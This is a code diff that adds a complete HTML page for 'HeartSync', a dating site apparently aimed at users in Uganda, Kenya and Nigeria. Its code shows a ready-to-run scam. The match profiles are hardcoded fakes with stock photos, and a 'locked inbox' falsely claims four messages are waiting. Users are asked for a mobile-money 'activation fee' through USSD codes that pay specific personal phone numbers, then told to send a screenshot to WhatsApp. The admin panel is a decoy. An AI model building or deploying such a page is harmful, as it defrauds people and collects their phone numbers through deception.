@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HeartSync | Premium African Dating</title>
+    <style>
+        :root { 
+            --primary: #ff4b2b; 
+            --secondary: #ff416c; 
+            --dark: #0f172a; 
+            --glass: rgba(255, 255, 255, 0.95);
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
+        body { background: linear-gradient(135deg, #1e293b, #0f172a); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; color: white; }
+        .container { width: 100%; max-width: 450px; }
+        .card { background: var(--glass); color: #1e293b; padding: 28px; border-radius: 28px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); margin-bottom: 20px; position: relative; overflow: hidden; }
+        h2, h3 { text-align: center; margin-bottom: 15px; font-weight: 800; letter-spacing: -0.5px; }
+        input, select, button, textarea { width: 100%; padding: 16px; margin-top: 14px; border-radius: 14px; border: 1px solid #e2e8f0; font-size: 16px; outline: none; transition: 0.3s; }
+        textarea { height: 90px; resize: none; }
+        button { background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(255, 75, 43, 0.3); }
+        button:active { transform: scale(0.98); }
+        .hidden { display: none; }
+        
+        /* HD Profiles */
+        .profile-img { width: 100%; height: 500px; object-fit: cover; border-radius: 24px; display: block; }
+        .profile-info { position: absolute; bottom: 20px; left: 20px; right: 20px; padding: 20px; background: rgba(15, 23, 42, 0.85); border-radius: 20px; color: white; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        
+        /* Payment Styles */
+        .ussd-box { background: #f8fafc; padding: 20px; border-radius: 18px; border: 1px solid #e2e8f0; margin: 15px 0; text-align: center; }
+        .ussd-code { font-family: 'Courier New', monospace; font-size: 22px; font-weight: 800; color: var(--primary); display: block; margin-bottom: 10px; }
+        .whatsapp-display { background: #f0fdf4; padding: 15px; border-radius: 14px; border: 1px dashed #22c55e; text-align: center; margin-top: 10px; }
+        .whatsapp-num { font-size: 22px; font-weight: bold; color: #166534; display: block; }
+        .note { font-size: 12px; color: #64748b; margin-top: 8px; font-style: italic; }
+
+        /* Admin Styles */
+        .admin-badge { background: #fee2e2; color: #991b1b; padding: 4px 10px; border-radius: 8px; font-size: 10px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div id="registerCard" class="card">
+        <h2 onclick="adminTrigger()" style="cursor: pointer;">HeartSync 💖</h2>
+        <p style="text-align: center; font-size: 14px; color: #64748b; margin-bottom: 10px;">Find your perfect match</p>
+        <input type="text" id="fullname" placeholder="Full Name">
+        <select id="countrySelect">
+            <option value="">Select Country</option>
+            <option value="Uganda">Uganda (UG)</option>
+            <option value="Kenya">Kenya (KE)</option>
+            <option value="Nigeria">Nigeria (NG)</option>
+        </select>
+        <input type="text" id="phone" placeholder="Phone Number (e.g. 07...)" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <textarea id="userBio" placeholder="Tell us about yourself..."></textarea>
+        <button onclick="register()">Start Matching</button>
+    </div>
+
+    <div id="app" class="hidden">
+        <input type="text" id="searchBar" placeholder="Search Kampala, Entebbe..." onkeyup="filterProfiles()" style="margin-bottom: 15px; background: white;">
+        <div id="profileContainer"></div>
+        <div class="card" style="margin-top:20px; text-align:center; padding: 30px;">
+            <h3>Private Inbox (Locked) 🔒</h3>
+            <p style="font-size:14px; color:#64748b; margin-bottom: 10px;">4 people sent you messages!</p>
+            <button onclick="goToPayment()">Unlock Messages</button>
+        </div>
+    </div>
+
+    <div id="paymentPage" class="hidden">
+        <div class="card">
+            <button onclick="goBack()" style="width:auto; background:#64748b; padding:8px 15px; font-size:12px; margin-bottom:15px; box-shadow: none;">← Back</button>
+            <h2>Premium Access 🌟</h2>
+            <p style="text-align:center; font-size:16px; font-weight: 600;">Activation Fee: <span style="color:var(--primary)">UGX 46,800</span></p>
+            
+            <select id="network" onchange="showUSSD()">
+                <option value="">Choose Payment Method</option>
+                <option value="MTN">MTN Mobile Money</option>
+                <option value="Airtel">Airtel Money</option>
+            </select>
+
+            <div id="ussdSection" class="hidden">
+                <div class="ussd-box">
+                    <span id="displayCode" class="ussd-code"></span>
+                    <button onclick="dialCode()">Direct Dial Now</button>
+                    <button onclick="copyCode()" style="background:#64748b; margin-top:8px;">Copy Code Manually</button>
+                    <p class="note">Note: If the dialer fails or says "Invalid Input", please copy the code and paste it directly into your phone dialer.</p>
+                </div>
+                
+                <div class="whatsapp-display">
+                    <p style="font-size:13px; color:#166534;">Send payment screenshot for approval:</p>
+                    <span class="whatsapp-num">0766393301</span>
+                </div>
+                <button onclick="openWA()" style="background:#22c55e; margin-top:15px; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);">Message WhatsApp Support</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="adminPanel" class="hidden">
+        <div class="card">
+            <h2>Admin Control Panel 🛠️</h2>
+            <div id="userList" style="max-height: 300px; overflow-y: auto; margin-top: 15px;">
+                </div>
+            <button onclick="closeAdmin()" style="background:#64748b; margin-top: 15px;">Exit Admin Mode</button>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    let currentUSSD = "";
+    const WA_NUMBER = "256766393301";
+    let clickCount = 0;
+
+    const profiles = [
+        { name: "Brenda, 24", loc: "Kampala", bio: "Serious vibes only. 💍", img: "https://images.unsplash.com/photo-1523913507744-1970511030d8?q=80&w=600&q=60" },
+        { name: "Moses, 29", loc: "Entebbe", bio: "Traveler & Entrepreneur.", img: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?q=80&w=600&q=60" },
+        { name: "Sarah, 22", loc: "Jinja", bio: "Love music and dancing.", img: "https://images.unsplash.com/photo-1531123897727-8f129e1688ce?q=80&w=600&q=60" },
+        { name: "Enock, 30", loc: "Mbarara", bio: "God fearing and stable.", img: "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=600&q=60" }
+    ];
+
+    window.onload = () => {
+        if(localStorage.getItem("hs_registered")) {
+            document.getElementById("registerCard").classList.add("hidden");
+            document.getElementById("app").classList.remove("hidden");
+            renderProfiles(profiles);
+        }
+    };
+
+    function adminTrigger() {
+        clickCount++;
+        if(clickCount >= 5) {
+            document.getElementById("registerCard").classList.add("hidden");
+            document.getElementById("app").classList.add("hidden");
+            document.getElementById("adminPanel").classList.remove("hidden");
+            loadAdminData();
+        }
+    }
+
+    function register() {
+        const name = document.getElementById("fullname").value;
+        const phone = document.getElementById("phone").value;
+        if(name.length < 3 || phone.length < 9) {
+            alert("Please enter full name and valid phone number.");
+            return;
+        }
+        localStorage.setItem("hs_registered", "true");
+        localStorage.setItem("hs_user", JSON.stringify({name, phone}));
+        document.getElementById("registerCard").classList.add("hidden");
+        document.getElementById("app").classList.remove("hidden");
+        renderProfiles(profiles);
+    }
+
+    function renderProfiles(data) {
+        const container = document.getElementById("profileContainer");
+        container.innerHTML = data.map(p => `
+            <div class="card" style="padding:0; height:500px;">
+                <img src="${p.img}" class="profile-img">
+                <div class="profile-info">
+                    <h3>${p.name} • ${p.loc}</h3>
+                    <p style="font-size:14px; opacity:0.9;">${p.bio}</p>
+                </div>
+            </div>
+        `).join('');
+    }
+
+    function filterProfiles() {
+        const term = document.getElementById("searchBar").value.toLowerCase();
+        const filtered = profiles.filter(p => p.name.toLowerCase().includes(term) || p.loc.toLowerCase().includes(term));
+        renderProfiles(filtered);
+    }
+
+    function showUSSD() {
+        const net = document.getElementById("network").value;
+        const section = document.getElementById("ussdSection");
+        if(!net) { section.classList.add("hidden"); return; }
+        section.classList.remove("hidden");
+        currentUSSD = (net === "MTN") ? "*165*1*0787591025*46800#" : "*185*1*0730101447*46800#";
+        document.getElementById("displayCode").innerText = currentUSSD;
+    }
+
+    function dialCode() {
+        // Fix for Android dialer error: encode # as %23
+        window.location.href = "tel:" + currentUSSD.replace("#", "%23");
+    }
+
+    function copyCode() {
+        navigator.clipboard.writeText(currentUSSD);
+        alert("USSD Code Copied! Paste it in your dialer.");
+    }
+
+    function openWA() {
+        const text = encodeURIComponent("Hello HeartSync, I've made my payment. Please approve my premium account.");
+        window.open(`https://api.whatsapp.com/send?phone=${WA_NUMBER}&text=${text}`, '_blank');
+    }
+
+    function goToPayment() { 
+        document.getElementById("app").classList.add("hidden"); 
+        document.getElementById("paymentPage").classList.remove("hidden"); 
+    }
+    
+    function goBack() { 
+        document.getElementById("paymentPage").classList.add("hidden"); 
+        document.getElementById("app").classList.remove("hidden"); 
+    }
+
+    function closeAdmin() {
+        clickCount = 0;
+        document.getElementById("adminPanel").classList.add("hidden");
+        document.getElementById("registerCard").classList.remove("hidden");
+    }
+
+    function loadAdminData() {
+        const user = JSON.parse(localStorage.getItem("hs_user") || '{"name":"No Users Yet", "phone":"N/A"}');
+        const list = document.getElementById("userList");
+        list.innerHTML = `
+            <div style="border-bottom:1px solid #ddd; padding:10px 0;">
+                <p><strong>${user.name}</strong> <span class="admin-badge">PENDING</span></p>
+                <p style="font-size:12px;">Phone: ${user.phone}</p>
+                <button onclick="alert('User Approved!')" style="padding:5px; font-size:12px; margin-top:5px; background: #22c55e;">Approve User</button>
+            </div>
+        `;
+    }
+</script>
+
+</body>
+</html>
